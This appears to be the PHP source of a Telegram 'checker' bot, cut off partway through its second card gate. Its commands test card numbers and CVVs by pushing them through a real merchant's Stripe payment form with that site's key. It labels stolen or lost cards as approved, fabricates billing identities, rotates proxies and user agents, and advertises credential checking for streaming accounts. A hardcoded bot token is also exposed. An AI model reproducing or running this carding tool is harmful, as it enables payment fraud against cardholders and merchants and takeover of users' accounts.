<?php

////////////////=============[Made with ❤️ by Aniruddh]===============////////////////

///https://api.telegram.org/bot<token>/setwebhook?url=<url>



$botToken = "1557349513:AAEwATXxZ9f5v5u9DMrvzE_wDoTGqwSY5Ho"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Aniruddh</b>", $message_id);
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<b>BIN Lookup:</b> <code>/bin</code> xxxxxx%0A<b>SK Key Check:</b> <code>/sk</code> sk_live_xxxxxxx%0A<b>CVV CHECKER:</b> <code>/cvv</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<b>CCN Gate 1(PM+Admin-ajax):</b> <code>/chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<b>CCN Gate 2(Sources+Cus):</b> <code>/ccn</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<b>Zee5 Checker:</b> <code>/zee5</code> Email:Pass%0A<b>VOOT Checker:</b> <code>/voot</code> Email:Pass%0A<b>ALT Balaji Checker:</b> <code>/altb</code> Email:Pass%0A<b>Info:</b> <code>/info</code> To know your info%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

//////////=========[Info Command]=========//////////

elseif (strpos($message, "/info") === 0){
sendMessage($chatId, "<b>ID:</b> <code>$userId</code>%0A<b>First Name:</b> $firstname%0A<b>Username:</b> @$username%0A%0A<b>Bot Made by: Aniruddh</b>", $message_id);
}

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
//$name = $fim['country']['alpha2']; ////country abbreviated example (US)
//$name = $fim['country']['name']; //// country
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
///$test2 = GetStr($fim, '"alpha2":"', '"'); ////country abbreviated example (US)
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}
curl_close($ch);

 
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Aniruddh </b>', $message_id);
}
curl_close($ch);

//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////
function random_ua() {
    $tiposDisponiveis = array("Chrome", "Firefox", "Opera", "Explorer");
    $tipoNavegador = $tiposDisponiveis[array_rand($tiposDisponiveis)];
    switch ($tipoNavegador) {
        case 'Chrome':
            $navegadoresChrome = array("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
            );
            return $navegadoresChrome[array_rand($navegadoresChrome)];
            break;
        case 'Firefox':
            $navegadoresFirefox = array("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0',
                'Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
                'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0',
                'Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
            );
            return $navegadoresFirefox[array_rand($navegadoresFirefox)];
            break;
        case 'Opera':
            $navegadoresOpera = array("Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
                'Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16',
                'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
                'Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02',
                'Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00',
                'Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00',
                'Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00',
                'Opera/12.0(Windows NT 5.1;U;en)Presto/22.9.168 Version/12.00',
                'Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
        case 'Explorer':
            $navegadoresOpera = array("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
                'Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)',
                'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)',
            );
            return $navegadoresOpera[array_rand($navegadoresOpera)];
            break;
    }
}
$ua = random_ua(); 


//////////////////////////===========RANDOM USER AGENT=============///////////////////////////////////

//////////=========[Chk Command]=========//////////

if ((strpos($message, "!chk") === 0)||(strpos($message, "/chk") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Proxys]===//////////////

$rp1 = array(
  1 => 'user-rotate:pass',
  2 => 'user-rotate:pass',
  3 => 'user-rotate:pass',
  4 => 'user-rotate:pass',
  5 => 'user-rotate:pass',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

////////////////////////////////////////////

////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "Proxy Live!";
}
if (empty($ip1)){
$ip = "Proxy Live!";
}

//echo '[ IP: '.$ip.' ] ';

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

///////////////=[1st REQ]=/////////////////

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: '.$ua.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Bhaiya&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=fd6829f4-98a9-40de-bcab-4a5529bf3f4e7714eb&muid=69514d46-e8d0-4587-a224-161bd566d73af7e68b&sid=f7abb0a3-4471-4f5d-9d48-e7985d22c11920c493&pasted_fields=number&payment_user_agent=stripe.js%2F8a2e5f97%3B+stripe-js-v3%2F8a2e5f97&time_on_page=74999&referrer=https%3A%2F%2Fwww.collegetransitions.com%2F&key=pk_live_Dfe4fmdbUbN69IrQo3AVGKhm');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# --------------- [2nd Req] ------------ #

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $socks5);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.collegetransitions.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.collegetransitions.com',
'method: POST',
'path: /wp-admin/admin-ajax.php',
'scheme: https',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: _ga=GA1.2.671363587.1604947087; _gid=GA1.2.85084638.1604947087; __stripe_mid=69514d46-e8d0-4587-a224-161bd566d73af7e68b; __stripe_sid=f7abb0a3-4471-4f5d-9d48-e7985d22c11920c493; _gali=submit--MzM1ZGY',
'origin: https://www.collegetransitions.com',
'referer: https://www.collegetransitions.com/pay-now/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua.'',
'x-requested-with: XMLHttpRequest',
));
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=wp_full_stripe_inline_payment_charge&wpfs-form-name=DefaultPayment&wpfs-custom-amount-unique=1&wpfs-card-holder-name=Bhaiya&wpfs-card-holder-email=hdidein@gmail.com&wpfs-billing-address-line-1=lund&wpfs-billing-address-line-2=&wpfs-billing-address-city=loda&wpfs-billing-address-state=California&wpfs-billing-address-zip=94701&wpfs-billing-address-country=US&wpfs-stripe-payment-method-id='.$id.'');

$result2 = curl_exec($ch);
$cvc_check = trim(strip_tags(getStr($result2,'"cvc_check":"','"')));
 $info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b> 『 ★ CVV LIVE ★ 』 『 ★ Insufficient Funds ★ 』 </b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ CCN MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b> 『 ★ CVV MATCHED ★ 』 『 ★ Card Doesnt Support Purchase ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>✅APPROVED</b>%0A<u>RESPONSE:</u> <b>『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Do_Not_Honor ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Incorrect Card Number ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Expired Card ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result2, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif (strpos($result1, "generic_decline")){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Declined : Generic_Decline ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Security Code Check : '.$cvc_check.' [Proxy Dead/change IP] ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>❌DECLINED</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>Bot Made by: Aniruddh</b>', $message_id);
}
elseif(!$result2){
sendMessage($chatId, ''.$result2.'');
}else{
sendMessage($chatId, ''.$result2.'');
}
curl_close($ch);
}





///////////////////////////////////////// CCN GATE 2 ///////////////////////////////////////////////////////

if ((strpos($message, "!ccn") === 0)||(strpos($message, "/ccn") === 0)){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$ano1 = substr($yyyy, 2, 4);
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////===[Randomizing Details 

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
